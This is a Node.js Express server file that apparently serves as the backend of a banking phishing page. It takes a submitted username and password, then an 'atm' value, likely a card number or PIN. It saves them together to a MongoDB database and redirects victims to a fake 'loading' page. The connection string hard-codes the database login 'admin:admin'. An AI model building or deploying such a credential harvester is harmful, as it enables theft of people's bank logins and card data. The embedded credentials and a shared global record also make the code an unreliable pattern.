const express = require("express"),
  app = express(),
  mongoose = require("mongoose"),
  bodyParser = require("body-parser"),
  User = require("./models/user");
app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());
app.set("view engine", "ejs");
app.use("/css", express.static(__dirname + "/public/css"));
app.use(express.static(__dirname + "/public"));
mongoose
  .connect(
    "mongodb+srv://admin:admin@cluster0-psomv.mongodb.net/test?retryWrites=true&w=majority",
    { useNewUrlParser: true }
  )
  .then(console.log("MongoDB Connected"))
  .catch(console.log("Something went wrong"));

let data = {};

app.get("/", (req, res) => {
  res.render("index");
});

app.get("/atm", (req, res) => {
  res.render("atm");
});

app.get("/loading", (req, res) => {
  res.render("loading");
});

app.post("/credentials", (req, res) => {
  onUserSubmit(req.body, res);
  // const newUser = {
  //   username: req.body.username,
  //   password: req.body.password
  // };
});

app.post("/atm", (req, res) => {
  onAtmSubtmit(req.body, res);
});

function onUserSubmit(params, res) {
  data = {
    username: params.username,
    password: params.password
  };
  res.redirect("/atm");
}

function onAtmSubtmit(params, res) {
  data.atm = params.atm;
  let NewUser = data;
  User.create(NewUser, (error, newUser) => {
    if (error) {
      console.log(error);
      res.redirect("/");
    } else {
      console.log("success on creating" + newUser);
      res.redirect("/loading");
    }
  });
}

app.listen(process.env.PORT, process.env.IP, function() {
  console.log("the app is running in " + process.env.PORT);
});
